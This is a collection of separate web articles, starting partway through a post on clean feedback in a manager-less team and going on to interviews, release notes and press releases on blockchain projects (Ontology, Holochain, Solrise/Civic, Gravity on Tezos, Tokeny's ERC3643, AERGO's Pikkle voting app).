working, particularly among many of us who may have worked in very different structures.</p><p>We have noticed that our shared spaces of reflection (weekly optional meetings for shared reflection) quite often hold space where people surface some of the deeper personal experiences or organisational dynamics they see and/or are sat with. Yet, we are currently lacking the triage and follow up support to link what people experience to group process work, coaching, therapy, practical needs or funding for the above for them to directly access this. We are currently putting an approach in place to this, and in August we signed off together a budget that will fund some of this provision. We welcome examples of how others have found ways to approach this as we work out how to structure this&nbsp;well.</p> Clean Feedback Screenshot of our shared Notion page with Clean Feedback&nbsp;guidance<p>Without managers, we still need processes for feedback and recognition. Providing clean feedback to each other — particularly after a potential misunderstanding or misalignment — becomes of the most caring acts that we can&nbsp;do.</p><p>Following Caitlin Walker’s conception of clean feedback in her book “From Contempt to Curiosity”, the biggest difference between regular and clean feedback is that the latter is designed/ prompted in a way that helps separate out what actually happened from what you are making up about that event and from the impact it is having. It also enables you to be specific in your feedback and put the growth of the receiver&nbsp;first.</p><p>This is made possible through a very simple structure for your feedback: 1. Evidence — what you saw or heard 2. Inference — the meaning you made of what you saw or heard 3. Impact — the effect it had on a situation or on&nbsp;you</p><p>We follow Brene Brown’s (from Dare to Lead) 10 signs of being in the right headspace to give feedback to know when the time is&nbsp;right.</p><p>Alongside the training courses that are run to help us to learn how to use this technique:</p>  We have a Clean Feedback page that details the intention, process and tools for&nbsp;it  There is a group of people who are available to help pairs or groups to use this technique with each other if they need additional support  <p>The act of sitting with a colleague in a space of respect and inviting them to improve is truly powerful, and can also be emotionally demanding. Clean feedback allows us to make time to recognise and truly see each other, our intentions, our labour and effort, even when the reason for the conversation may have been conflict. We are all learning, at a different pace and progress, how to use these techniques well to improve the quality of our relationships, and we all make mistakes along the&nbsp;way.</p><p>In blog 4, we will look at how we organise as a team to build organisational infrastructure and the impact that our way of organising has on our ability to do our work. We will look at how it feels to work in this&nbsp;way.</p><p>If you would like to receive updates (every few weeks/months) about the #BeyondtheRules project you can do so via <a href="https://dark-matter-labs.typeform.com/to/jpm8rdp1?typeform-source=provocations.darkmatterlabs.org">this short form</a>.

 This is an ongoing series featuring Ontology’s Harbingers. Harbingers are exceptional leaders that help Ontology grow its community and ecosystem, making it an ever-stronger blockchain, and decentralized identity and data&nbsp;leader. <p>In the seventh interview in this series, Ontology speaks with <a href="https://twitter.com/hackteen">Hamzat</a>, administrator of our <a href="https://t.me/OntologyNetwork">English Community</a>.</p> 1. How did you hear about Ontology? What drew you to Ontology? <p>I heard about Ontology in the early days from online blockchain communities. I subscribed to the Ontology newsletter and the rest is&nbsp;history.</p><p>What attracted me to the project was its novel approach to making digital identity easy to prevent data theft, abuse etc., even before news about GDPR and Cambridge Analytica surfaced. So, the foresight of the team alone was sufficient to make me want to get involved.</p> 2. What made you become a supporter of Ontology and a champion of its&nbsp;brand? <p>Ontology was of interest to me owing to its novel consensus approach, solution to data theft and privacy and lastly, building a future proof digital identity framework that could stand the test of time. Helping others to understand Ontology’s mission and vision is the reason I became a supporter and champion of its&nbsp;brand.</p> 3. What do you see as the key role of a Harbinger? What is your favorite thing about being a Harbinger? <p>Being able to communicate or share information about developments in the Ontology ecosystem, helping people learn about Ontology, solving their issues (<a href="http://onto.app">ONTO Wallet</a>, staking, and general knowledge) while providing feedback are my key roles as a Harbinger. My favorite part is the ability to help others and seeing them&nbsp;grow.</p> 4. Why is being part of the Ontology community important to&nbsp;you? <p>Ontology has a very big mission and vision to accomplish as regards building a future proof digital identity framework that can stand the test of time. Ontology achieving this milestone and more is the reason I am supporting the&nbsp;project.</p> 5. How is Ontology’s community different from other blockchain communities, is there anything that makes it stand&nbsp;out? <p>Ontology has created a niche for itself, being a fairly distributed token project with a novel consensus mechanism. Aside from that, Ontology has support for over 30 languages/local communities working together with the mission of building a truly future proof decentralized identity framework.</p> 6. What do you use as your key channels for engagement with the Ontology community and why? Would you like to see any&nbsp;others? <p>My key communication channels for engagement are Telegram and Twitter. Though Ontology has a community and sub-communities with respect to different languages on Telegram, Reddit, Discord, YouTube, WeChat, and Kakao. Overall, <a href="https://t.me/OntologyNetwork">Telegram</a> makes it easy to communicate and manage group activities as well as resolve issues. I would like Ontology to do more Twitter threads, which will call for engagement and feedback when explaining newly launched products, integration or implementation.</p> 7. Can you share a memorable experience or something you’ve learned from being a Harbinger? What advice would you give to someone looking to become a Harbinger? <p>The community being unapologetic, ready to help, also most are selfless. That alone is a memorable moment for the community. Lastly, the Ontology team is very innovative. My advice to people wanting to become a Harbinger is that they should be selfless and helpful to&nbsp;others.</p> 8. How would you describe the Ontology community in three&nbsp;words? <p>Educational, unique and innovative.</p> 9. How do you think Ontology could expand its community going forward? What would you like to see more/less of? What kinds of things do you see community members do that you think help our community grow? <p>Ontology, as a blockchain startup, has grown over the years and has achieved many important milestones and partnerships with other blockchains. Worth mentioning, is the provision of their novel DID protocol for use on Binance Smart Chain and also the Welcome Home app for&nbsp;Daimler.</p><p>There is room for improvement in the area of marketing and communication. We have a good product to showcase but marketing is important for widespread acceptance and adoption. Twitter threads can help explain new products, updates, implementations or integrations, and feedback from the community, which positively impacts the project both short and medium long&nbsp;term.</p> 10. What do you see as the key milestones for Ontology and how can the community help with achieving these? <p>As stated above, integration with Binance Smart Chain is a huge one that could open doors with other projects to integrate Ontology’s decentralized identity framework. So, the community understanding Ontology’s mission and vision is very important, as it will help in educating others and thereby impacting their lives in a positive&nbsp;way.</p><p>To learn more about Ontology’s Harbinger Program and how you can get involved, check out our updated&nbsp;<a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">GUIDE</a>.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

<p>This week’s release brings few developer-facing features, but it’s a big one in terms of performance. Holochain v0.0.107 is set to unleash an explosion of progress for the HoloPort Alpha Program.</p> V0.0.107 is for Holo hosting <p>Even though we’ve released a number of Holochain versions with plenty of features and fixes, the version on the HoloPorts is over three months old. That’s mainly because we <a href="https://blog.holochain.org/holochain-gets-some-parts-upgrades/#lmdb-to-sqlite-the-road-to-infinite-scalability">switched to a new database engine called SQLite</a>. This change held long-term promise for making Holochain infinitely scalable via sharding, but in the short term performance was much <a href="https://blog.holochain.org/dev-pulse-94-when-signup-goes-wrong/">slower</a> than the <a href="https://blog.holochain.org/a-new-holochain-developer-release/#seen-in-dev-team-land-upcoming-initiatives">previous database engine, LMDB</a>. The Holo team decided it would make an unacceptable experience for Elemental Chat testers, so they decided to stay with the LMDB version until the SQLite version could match its speed.</p><p>I’m excited to share that the SQLite version is now even faster, more efficient, more stable, and more reliable than the LMDB version. The dev team has recently made optimisations and bug fixes to the database layer and gossiping, and data is now getting stored and gossiped faster, while HoloPorts can comfortably host more users per machine.</p><blockquote>“I'm also getting really good results. We easily pass LMDB parity targets.”<br>— Alastair Ong, Holo engineer, after running Elemental Chat stress tests on Holochain v0.0.107</blockquote><p>After chatting with Alastair, I learned that <a href="https://twitter.com/H_O_L_O_/status/1437908801135554561">every performance benchmark has been surpassed</a>: some are slightly better, while others are orders of magnitude better. One Elemental Chat benchmark, designed to measure the time it took for all agents to reach consistency, went from a hefty 10.23 minutes to a tiny 36 seconds (a 17× improvement). These performance gains come with significantly reduced resource consumption; another test was able to host seven times more agents on the same hardware.</p><p>(And we suspect that things are even better than that — perhaps up to 100× better for some metrics. The main bottleneck now appears to be our <a href="https://github.com/holochain/tryorama">testing framework</a>, not Holochain itself.)</p><p>Now that the Holo team can move to this version, they’ll update Elemental Chat and the Holo suite of apps to take advantage of it. Service Logger, Holo Hosting App, HoloFuel, the HoloPort registration flow, and the client/host connection components will get features and fixes that have been planned for a while.</p><p>And it also means we can start inviting more hosts and Elemental Chat testers to participate — which paves the way for the <a href="https://medium.com/h-o-l-o/the-holoport-alpha-program-f35324ba367d">HoloPort Alpha Program</a>! If you’re a HoloPort owner, <a href="https://forum.holo.host/t/holoport-alpha-program-registration-general-info/3687">here are the instructions</a> for registering in the program.</p> v0.0.107 Is for the Dev Camp <p>You may have <a href="https://blog.holochain.org/dev-camp-8-starts-in-two-weeks/#dev-camp-8-huge-turnout-exciting-curriculum">heard the news</a> that the community-led Dev Camp 8 starts next week. In order to support the Dev Camp, we wanted a fairly stable version of Holochain so that participants have a good experience. This release comes after a lot of improvements, so we’re confident that it’s a good baseline for them to start building on.</p><p>Of course, there will be weekly Holochain releases throughout the Dev Camp, so it’ll keep getting more solid. We intend to keep updating participants about breaking changes and new features</p> Holochain v0.0.107 changelog   Relaxed chain top ordering properly merged (<a href="https://github.com/holochain/holochain/pull/985">#985</a>): This feature was scheduled for last release, but an incomplete merge caused it to be non-functional.  Only one agent full-sync (<a href="https://github.com/holochain/holochain/pull/978">#978</a>): This interim fix allows a conductor hosting multiple agents in the same DHT (such as a Holo host) to only involve one of their agents in DHT syncing, which reduces gossip traffic dramatically in full-sync DHTs. This feature is behind the configuration parameter <code>network.tuning_params.gossip_single_storage_arc_per_space</code>, and is disabled by default. Native Holochain installations are unlikely to benefit from it. (Holo hosts, on the other hand, see up to a 50× increase in the number of cells they can comfortably handle.)  Fix SQLite connection parameters (<a href="https://github.com/holochain/holochain/pull/978">#978</a>): These fixes resulted in big speedups for HDD-based HoloPorts and should be helpful for native Holochain installations too. As part of these fixes, you can tune the durability of writes with the configuration parameter <code>db_sync_mode</code>, which mirrors SQLite’s <a href="https://www.sqlite.org/pragma.html#pragma_synchronous"><code>synchronous</code></a> flag.  Web happ bundle helpers (<a href="https://github.com/holochain/holochain/pull/991">#991</a>): These internal fixes help the upcoming <a href="https://github.com/holochain/launcher">Holochain Launcher</a> manage installed hApps more easily.   Dev Camp excitement building <p>Well, even though I’m not a developer (at least not anymore), I thought I might help out with Dev Camp. So I’ve been privileged to listen to the back-room conversations of the organisers and support team, and they’re getting really excited! With 1500 applicants, it’s been a bit overwhelming, but they’ve changed the format in ways that will support everyone better.</p><p>The Holochain community stretches the globe, so it’s appropriate that the Dev Camp is shifting to support people who aren’t in the ideal time zone. Although the sessions will favour people in the Europe, Middle East, and African time zones, they’ll be recorded, and there will also be live support sessions for the Americas and Asia-Pacific. And there will also be a dedicated Discord server for anytime conversation — both among participants, and from support volunteers. And lastly, the Dev Camp section of the forum will be there for more lengthy discussions.</p><p>The app you’ll be building, called Tragedy of the Holocommons, is a turn-based game in which players try to consume natural resources cooperatively without causing them to collapse. It will exercise and grow your understanding of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">eventual consistency</a> (a very important concept in hApp design), <a href="https://developer.holochain.org/concepts/6_crud_actions/">CRUD chains</a>, <a href="https://developer.holochain.org/concepts/5_links_anchors/">links, anchors</a>, <a href="https://developer.holochain.org/concepts/9_signals/">signals</a> and more in a format that lets you learn with your peers and gain wisdom from experienced developers.</p><p>Each Dev Camp is hosted by a slightly different team of community members. It takes a lot of work, a lot of care and time, to organise something this big, and they're doing it all for free. It’s truly a labour of love, and I want to thank the current team Nastasia, Alex, Tim, Guillem, Hedayat, Lily, Peter, Tats, Sid, and the many other contributors for everything they’re doing.</p> Still time to register! <p>But it starts next week, so do hurry! It’s free, the curriculum sounds really fun, and it’s got a great crew of leaders, facilitators, teachers, and mentors. It’ll last six weeks (with a break in the middle), with weekly live sessions for Europe time zones and support sessions for Asia-Pacific and the Americas. There’ll also be a Discord server where you can talk with participants and the support team any time you like. Now <a href="https://holochain.org/dev-camp">go and sign up</a>!</p> Holochain In Action: Composability in the real world <p>During today’s AMA, the <a href="https://youtu.be/G9Q05C-Gv6A?t=2676">conversation turned to composability</a>. The developers among you are familiar with that term, but for those of you who aren’t, it means “the ability to easily glue chunks of software together to make new things”.</p><p>Why do we care about this? Highly composable software modules, which try to do only one thing and do it well, can unleash an explosion of creativity among the developers who find them and start playing with them.</p><p>It sounds like a good way to build software, doesn’t it? We think so too, and so do many of the developers who build with Holochain.</p><blockquote>“The composability of a Holochain application is a very fundamental thing about it, so [during Dev Camp] we will cover the architectural things that follow from it: how do you build applications differently, knowing that they can be composed from so many different parts?”<br>—Nastasia Emelianova, Dev Camp 8 lead organiser</blockquote><blockquote>“This is one of those features or capacities of the framework that stands to accelerate what’s possible in app development. [Knowing that Dev Camp will get that out] in a way that’s intelligible [to developers] early enough so that they’re not doing it the hard way, but actually learning from the get-go, that you can lean on the expertise of others and the things that others built — that’s what I’m super excited about.”<br>—Mary Camacho, Holo executive director</blockquote><p>The latest Holochain In Action session, number 18, takes a deeper look at the <a href="https://github.com/eyss/elemental-chess">Elemental Chess</a> hApp. This time it looks at how the app is actually just a collection of composable modules — <a href="https://github.com/holochain-open-dev/profiles">profiles</a> to allow players to give themselves human-readable names, <a href="https://github.com/eyss/invitations">invitations</a> to allow them to invite each other to a game, <a href="https://github.com/holochain/elemental-chat/tree/develop/crates/joining_code">joining_code</a> to manage access to game spaces, and <a href="https://github.com/eyss/hc-turn-based-game">hc_turn_based_game</a> which is the engine that powers the games. On top of this are a zome that actually <a href="https://github.com/eyss/elemental-chess/tree/main/dna/zomes/chess">implements the rules of chess</a> and a <a href="https://github.com/eyss/elemental-chess/tree/main/ui">UI</a> that brings it all together.</p><p>Their exploration of hc_turn_based_game shows the power of composability — when all the heavy bits are already built, it becomes quick and easy to build a new game. They’ve already done tic-tac-toe, and I hear they’re working on Elemental Go (the <a href="https://en.wikipedia.org/wiki/Go_(game)">game</a>, not the <a href="https://golang.org/">programming language</a>) next.</p> Subscribe to blog posts by email! <p>Yeah, it’s kind of old-fashioned, but email newsletters are also kind of cool again. If you like reading the Dev Pulse and other Holochain blog columns, but don’t like having to check the blog all the time, make life easier on yourself — just subscribe. 😉 You’ll find the form below the comments section.</p><p>Cover photo by <a href="https://unsplash.com/@ralphkayden?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Ralph (Ravi) Kayden</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

<p>The first on-chain decentralized exchange on Solana with permissioned access based on digital identity, Solrise DEX Pro, launches today.</p>



<p>LONDON and SAN FRANCISCO (Sept. 23, 2021) — <a href="https://solrise.finance/">Solrise Finance</a>, a Solana-based decentralized investment platform, and Civic Technologies, a leading innovator in digital identity solutions, have partnered to launch the first on-chain decentralized exchange on Solana with permissioned access based on digital identity. With growing regulatory scrutiny, a permissioned DEX sets the stage for more checks and balances within the DeFi ecosystem.</p>



<p>“This is our way of bridging the world of institutions to DeFi without resorting to centralization, thanks to Civic,” said Filip Dragoslavic, Co-Founder of Solrise. “With Solana already being the most familiar DeFi ecosystem for traditional finance, we expect to become one of the primary hubs for institutions that wish to jump into the ecosystem.”</p>



<p>The new DEX, named Solrise DEX Pro, is built on Project Serum, an on-chain decentralized exchange that utilizes Solana’s throughput to offer a traditional order book experience. Civic Pass, Civic’s identity verification for DeFi or any dApp, and Solrise DEX Pro together create a permissioned environment that is more suitable for institutional players. Solrise DEX Pro will receive support from one of the largest digital asset firms in the space, Alameda Research, a key investor in the Solana ecosystem. The firm will be providing initial liquidity for the DEX as well as ongoing support.&nbsp;</p>



<p>Though permissionless access is considered a core principle of DeFi, the concept is often at odds with the goals of large capital allocators. These institutional investors would like to participate in the DeFi ecosystem, but must meet specific regulatory requirements in order to do so. The introduction of Solrise DEX Pro allows the Civic and Solrise teams to create a parallel ecosystem for institutional players, which are able to tap into the larger ecosystem of Solana on-chain liquidity, while staying in a familiar and permissioned environment. The platform is designed to complement existing permissionless DeFi structures rather than to replace them.</p>



<p>“A permissioned DEX paves the way for more participants in the DeFi ecosystem, including institutional investment,” said Chris Hart, CEO of Civic. “We’re building technology that thoughtfully protects individuals, their digital identities and our new financial systems. In Solrise, we’ve found a partner that shares our values and is working with us to set a higher standard that will ultimately benefit the broader industry.”</p>

 Interview Introduction <p>In the installment of the XTZ.News “Tezos Dev Series”, <a href="https://www.gravity.earth/">Gravity</a> offers a Q&amp;A with our Lead Engineer, François&nbsp;Guérin.</p><p>In this Q&amp;A, François shares his insights on the Tezos ecosystem and his experience developing Gravity’s decentralized identity protocol on&nbsp;Tezos.</p><p>François, can you start off with a short intro about yourself and your work at&nbsp;Gravity?</p><p>I’ve been the Lead Engineer at Gravity for the last two and a half years. After getting a Master’s degree in Math, Computer Science and Cryptography, my first experience with blockchain was as the Blockchain Tech Lead at Aubay France, where I implemented a private blockchain within a compliant document certification application.</p><p>Now, I manage the technical team at Gravity, which includes an IT Development Manager and Frontend Developer. At Gravity, we leverage blockchain technology to build trusted digital identities.</p><p>Users and small businesses leverage Gravity to safely share their personal data to access services such as financing, humanitarian aid, employment, and government services. International organizations and institutions use Gravity to efficiently collect verifiable data for improved service delivery, interoperability and&nbsp;impact.</p><p>As the Lead Developer, a big part of my role is to build Gravity’s decentralized identity protocol and blockchain architecture on&nbsp;Tezos.</p><p>I’ve also worked to deploy a decentralized credential repository and have Gravity’s decentralized identity protocol recognized by W3C standards as a <a href="https://twitter.com/gravityID_earth/status/1382325329277124608?s=20">W3C decentralized identity verifiable credentials standards implementation</a>, ensuring that our protocol is more scalable, standardized and transparent.</p><p>Why are you interested in blockchain?</p><p>I like that with blockchain, there’s a direct application of my studies with this intersection of math, cryptography and computer&nbsp;science.</p><p>Blockchain is also a technology that’s still somewhat “new” for a lot of people, and it’s constantly evolving. I like that there’s a lot that you can learn from and bring to the blockchain tech community.</p><p>What has been your experience developing on&nbsp;Tezos?</p><p>With Tezos, it’s really exciting as an engineer to be challenged to innovate and develop in a space that’s always evolving and growing. I have experience with smart contract development using Michelson, the native language for smart contracts.</p><p>I’ve also had the chance to implement Gravity’s own version of the <a href="https://www.gravity.earth/gravity-glossary/#gravity-protocol">Tezos DID Method</a> and <a href="https://www.gravity.earth/gravity-glossary/#gravity-protocol">DID Manager</a>, which are key components of our decentralized identity protocol on&nbsp;Tezos.</p><p>A DID Method is the mechanism by which a particular type of decentralized identifier (DID) and its associated DID document are created, resolved, updated and deactivated.</p><p>The Tezos DID Method specifies how Tezos can be used for DID creation and management, compatible with the issuance, storage, and verification of Verifiable Credentials. DID Managers are smart contracts on the Tezos blockchain that implement the Tezos DID method’s specific on-chain functionalities.</p><p>What tools do you&nbsp;like?</p><p>Personally, I like spoons. No, but really, I like Taquito. Each Tezos node exposes an http API so we can access them. Taquito wraps an http client in order to access the http API in a more convenient way.</p><p>What do you find most valuable about developing on Tezos compared to other blockchains?</p><p>I think the Tezos ecosystem’s focus on formal verification of smart contracts and on-chain governance is extremely important. And compared to Ethereum and Bitcoin, Tezos is cheaper, more efficient and better for the environment. Because Tezos is a liquid-proof of stake protocol, it also consumes less resources than the proof of work of other blockchains.</p><p>For me, elliptic curves are something that you don’t typically see as a developer. As someone with a math background, I see the importance of having a strong cryptographic mechanism, which Tezos offers. Because the language is extremely cryptic, it also allows developers to have greater control over what we’re developing.</p><p>What Tezos projects are you most excited&nbsp;about?</p><p>Everything is interesting, but I really like TZIP-16! It’s powerful, and you can have what we call “views functions” attribute getters and meta-data. It’s not only the smart contract, you also have this upper layer that allows you to have off-chain data.</p><p>It was great when I worked to integrate Gravity with the TZIP-16 standard. With this <a href="https://twitter.com/gravityID_earth/status/1374401827664400395?s=20">TZIP-16 implementation</a>, now we can provide off-chain metadata during the resolution of DID Documents from&nbsp;DIDs.</p><p>What do you hope to see from the Tezos ecosystem in the&nbsp;future?</p><p>If something like OpenTimestamps appears on Tezos, it would be really exciting!</p><p>What’s on the horizon for&nbsp;Gravity?</p><p>Most people know about Gravity’s work with organisations like the UNDP Turkey, the Kenya Red Cross and the DIGID Project consortium of NGOs to leverage decentralized identity for improved humanitarian action (check out the <a href="https://medium.com/gravity-earth">latest case studies on our Medium blog</a> to learn&nbsp;more).</p><p>As we continue to deepen our work in the humanitarian space, Gravity is also focusing on building out our supply chain finance (SCF) use case. In fact, we just <a href="https://youtu.be/AhiKZUa__5o">released a new video</a> to share how our digital ID solutions for supply chain financing work.</p><p>The idea is that our SCF solution builds trust among financial service providers, merchants and suppliers to unlock greater financing opportunities for all stakeholders.</p><p>Our tech team is really excited to be developing this solution, which uses decentralized ID and blockchain technology to enable small business merchants to create trusted financial identities using digital ID wallets that can give them access to affordable working capital and help them grow their businesses.</p><p>As an engineer, it’s awesome to keep building technology that can be leveraged for different real-world use cases and have such a big impact on people’s everyday&nbsp;lives!</p><p>To learn more about Gravity, follow us&nbsp;today!</p><p>Gravity is an ID2020-certified digital ID solution that empowers individuals, international organisations, and governments to create trusted decentralized identities that are private, portable, and persistent.</p><p>Our vision is to build human-centered digital ID solutions for easy, transparent, and secure data sharing for all people, anywhere in the world.

			<p>Luxembourg, 23rd September — Tokeny Solutions has announced the recognition of the T-REX protocol as ERC3643. The open source suite of smart contracts enables the issuance, management and transfer of permissioned tokens and is already used by large financial institutions to tokenize real-world assets.</p>
<p></p>
<p>The Ethereum community has officially merged the T-REX protocol in its GitHub repository of EIPs as ERC3643, making it an official standard for permissioned tokens. The ERC3643 allows actors in capital markets to interact with DeFi and the broader digital assets market in full compliance.</p>
<p>Amidst its continued explosion in growth this year, regulatory bodies around the world are getting ready to clamp down on the DeFi space. According to DeFi Pulse, in the first half of 2021, the total value locked (TVL) in the space by users grew from $25bn to $70bn, almost 180%. With this in mind, the space has now firmly caught the attention of regulators, and their focus will be turned to any actor not following regulatory obligations.</p>
<p>The ERC3643 allows actors wishing to interact with digital assets to ensure their activities remain compliant with global regulatory requirements. Since its inception in 2018, the standard has been used to issue security tokens worth over $8.5bn across in 180+ jurisdictions via the T-REX platform. It does this through the use of permissioned tokens and digital identities, i.e. tokens that can only be sent or received based on the verified credentials of investors.</p>
<p>These tokens are fully controllable by their issuer and can be recovered even if the private key of the wallet holding them is lost, as the ownership of the assets is guaranteed by digital identity. In the same way, the ERC3643 can represent cryptocurrencies, stablecoins, fiat currencies and NFTs to ensure compliance and ownership for both investors and responsible entities.</p>
<p>ERC3643 is compatible with the well-known ERC20 standard, enabling interoperability with any wallet of the Ethereum ecosystem. Also, it can be deployed on any Ethereum Virtual Machine (EVM) compatible blockchains, sidechains and Layer 2 solutions. Concerning security, the standard has been audited and confirmed by cybersecurity firm Kaspersky. Meanwhile, the ERC3643 is licensed under CC0 1.0, allowing developers and companies to contribute, copy, modify, distribute and develop the standard.</p>

		 
	 
    It’s been more than three years since we started the development of the T-REX security token protocol. We are extremely excited that the interface has been recognized as ERC3643 and merged into the EIP repository on GitHub. It is now the go-to standard for those issuing security tokens on public blockchains.  Joachim LebrunHead of Innovation at Tokeny Solutions       As the DeFi space continues to grow in both size and also maturity, the need for compliance will continue to rise in importance. Investors need protection, and issuers need to know who they are dealing with, and this is exactly what the ERC3643 does. We’re delighted to take this role in the industry, and continue to build the space’s credibility by allowing actors to remain compliant.  Luc FalempinCEO at Tokeny Solutions

<p>Introduction: The Amalgamation Of Democratic Governance Within AERGO: Pikkle’s Purpose And How It&nbsp;Works</p>Pikkle Is The First Blockchain Based Voting And Global Viewer Participation Platform Built On&nbsp;AERGO<p>It is evident that the democratic process hasn’t been perfected since its inception in ancient India and ancient Athens and it is time for that to finally change 2500 years since its inception. With innovations in immutable and transparent technology, brought on by the blockchain, we as a society have the opportunity to revolutionize the democratic process to promote an equitable environment for egalitarian populism. On the AERGO blockchain exists a voting platform that has been utilized by the Korean Broadcasters Association, an institution that has existed since 1974 with over 40 members of the organization nationwide in South Korea. Pikkle aims to solve numerous issues that plague the democratic process which include: cost inefficacy, voter targeting and fraudulent ballot counts. Pikkle has also identified a major dilemma that has only existed for the last 20 years, with the advent of social media where internet titans can easily manipulate and influence voter participation for the political intent of the platform itself. Pikkle aims to solve that stagnation of democracy and resuscitate the virtue of democratic egalitarianism.</p><p>Pikkle operates in a seamless manner where individuals who aren’t adept in the realm of blockchain can utilize this application without even realizing it operates on a blockchain. Pikkle collects users views and assists in their decision making through an app service instead of the traditional cold calling and electioneering paradigms that have persisted in the 20th century into the 21st. Through the immutable and transparent technology known as blockchain, in this case, AERGO, Pikkle aims to prevent stakeholders and platform titans from interfering or manipulating voters; its main vision is to create an equitable environment for all participants. This holds true to the value of its name “Pikkle” a direct amalgamation of the two works “Pick” and “People.”</p><p>Data Analysis: Pikkle In Action: AERGO’S Promotion Of The Democratic Process</p>Blockchain Is The Next Step In The Democratic Process And Through Analysis, We Can See This In Action With&nbsp;Pikkle<p>Democracy cannot truly be tested for equity without its fair share of data analyst on the basis of actual egalitarian populism through actual elections. At AERGO and Blocko, it is evident that these sister companies understood well that “so-called experts” were not making fair evaluations on the basis of social media cultural voting. It is evident that internet decisions are based on the cultural and political bias’s of the platform itself, and in recent years, many social media platforms, specifically Twitter and Facebook, have been accused of politically drawn motives in the last three American elections. Pikkle resolves such a notion with a dynamic solution: make it impossible for votes to be tampered with by recording all voting results in real-time on the AERGO public blockchain (not private) while simultaneously eliminating high costs of voting that can incur when consolidating government entities and ballot counters, promoting monetary and equitable efficiency. Now the main question is, although all of this sounds incredible, has it been used and proven effective as an application, and the simple answer is, yes, absolutely, numerous times within the Seoul Drama Awards hosted in South&nbsp;Korea.</p><p>Data Analysis Continued: The Ceremonial Events That Utilized Pikkle: The Democratic Voting Paradigm Of The&nbsp;Future</p>Did You Know That Pikkle Has Been Utilized In One Of The Most Prominent Media Events In Asia, Specifically South&nbsp;Korea?<p>Talk is cheap, and action creates value and vision, and Pikkle does just that. Pikkle was utilized in the Seoul Drama Awards that had a widespread affect throughout South Korea and into neighboring nations as well and it is important to highlight the importance and wide-spread participation that this event created. It is incumbent to realize the immense amount of votes that incurred that Pikkle has created in in just a short amount of time since its inception and you will be shocked with the amount of total votes that occurred with Pikkle. I’m sure you’re curious to see the numbers, and we will get there shortly I&nbsp;promise!</p><p>Pikkle is a world-wide phenomenon that isn’t exclusive to AERGO’S country of origin, South Korea and has garnered a foothold in not only East Asia, but South East Asia as well. The Seoul Drama Awards Korean Drama Award was a celebration of the Best Male and Female Actors, the Best Picture and the Best Theme Song. This was a South Korean event and proves the point that Pikkle has a dominant foothold in its home nation as a blockchain alternative to traditional voting mechanisms.

This data proves that AERGO can withstand over 200,000 transactions a day and 3 events per second. In large-scale of things, specifically surrounding the real-time voting that occurred resulting from these events, where records are lost due to a large number of concurrent viewers, the AERGO mainnet blockchain had stable data processing without any loss whatsoever even in cases with up to 70,000 concurrent users, 16 awards at 4 awards.

There was only a slight issue that occurred due to the nature of blockchain, not because of any issue with the AERGO mainnet itself. Resulting from the immutable feature of blockchain technology, when the initial organizers requirement to involve as many users as possible were set, they could not be changed in the middle of the voting process. The AERGO team understood this greatly, and intends on utilizing this process for future voting cases to emphasize the importance of setting initial requirements before utilization.</p><p>Conclusion: Pikkle, The Future Of Democratic Function</p>Pikkle Is A Blockchain Voting Platform That Will Only Expand Its Utility In The Future So Stay&nbsp;Tuned!<p>Based on the results of the utility of this application in accordance to the amount of votes that were cast, it is evident that Pikkle has solidified its ability as a unique and expansive blockchain voting platform that is here to stay, and will only grow substantially in the future.
